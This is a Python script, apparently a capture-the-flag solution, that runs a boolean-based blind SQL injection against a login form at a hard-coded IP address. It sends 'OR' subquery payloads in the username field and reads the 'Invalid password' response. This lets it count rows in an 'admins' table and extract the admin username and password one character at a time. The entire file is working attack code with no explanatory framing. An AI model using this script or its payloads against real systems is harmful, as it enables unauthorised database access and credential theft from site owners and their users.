import requests

url = "http://34.94.3.143/816a0a9f74/login"

tableName = "admins"
columnName1 = "username"
columnName2 = "password"
keyword = "Invalid password"

# First we will find the amount of rows in the main column
print("Finding number of rows in table")

keywordFound = False
tableSize = 0
while not keywordFound:
    payload = "foo' OR (SELECT count(" + columnName1 + ") FROM " + tableName + ")=" + str(tableSize) + " ;-- "
    data = {columnName1: payload, columnName2: ""}

    response = requests.post(url, data).text
    if keyword in response:
        keywordFound = True
    else:
        tableSize += 1

print("Table size = " + str(tableSize))

# Next, we need to find the length of the username value
rowIndex = 0
print("Finding length of username")

usernameLengthFound = False
usernameLength = 0
while not usernameLengthFound:
    payload = "foo' OR length(substr((select " + columnName1 + " FROM " + tableName + " LIMIT " + str(rowIndex) + ",1),1))=" + str(usernameLength) + " ;-- "
    data = {columnName1: payload, columnName2: ""}

    response = requests.post(url, data).text
    if keyword in response:
        usernameLengthFound = True
    else:
        usernameLength += 1

print("Username length = " + str(usernameLength))

# Next, we are going to guess the username
print("Guessing username")

usernameFound = False
usernameCharIdx = 1
username = ""

while not usernameFound:
    usernameCharFound = False
    asciiGuess = 0

    # Guess single character
    while not usernameCharFound:
        payload = "foo' OR ascii(substr((select " + columnName1 + " FROM " + tableName + " LIMIT " + str(rowIndex) + ",1),"+str(usernameCharIdx)+",1))=" + str(asciiGuess) + " ;-- "
        data = {columnName1: payload, columnName2: ""}

        response = requests.post(url, data).text
        if keyword in response:
            usernameCharFound = True
            username += chr(asciiGuess)
            print(username)
        else:
            asciiGuess += 1

    usernameCharIdx += 1
    # Check if username is found
    if usernameCharIdx > usernameLength:
        usernameFound = True

print("Username found: " + username)

# Now we will guess the password of the user
# First, find the lenght of the password
rowIndex = 0
print("Finding length of password")

passwordLengthFound = False
passwordLength = 0
while not passwordLengthFound:
    payload = "foo' OR length(substr((select " + columnName2 + " FROM " + tableName + " LIMIT " + str(rowIndex) + ",1),1))=" + str(passwordLength) + " ;-- "
    data = {columnName1: payload, columnName2: ""}

    response = requests.post(url, data).text
    if keyword in response:
        passwordLengthFound = True
    else:
        passwordLength += 1

print("Password length = " + str(passwordLength))

# Next, we are going to guess the password
print("Guessing password")

passwordFound = False
passwordCharIdx = 1
password = ""

while not passwordFound:
    passwordCharFound = False
    asciiGuess = 0

    # Guess single character
    while not passwordCharFound:
        payload = "foo' OR ascii(substr((select " + columnName2 + " FROM " + tableName + " LIMIT " + str(rowIndex) + ",1),"+str(passwordCharIdx)+",1))=" + str(asciiGuess) + " ;-- "
        data = {columnName1: payload, columnName2: ""}

        response = requests.post(url, data).text
        if keyword in response:
            passwordCharFound = True
            password += chr(asciiGuess)
            print(password)
        else:
            asciiGuess += 1

    passwordCharIdx += 1
    # Check if username is found
    if passwordCharIdx > passwordLength:
        passwordFound = True

print("Password found: " + password)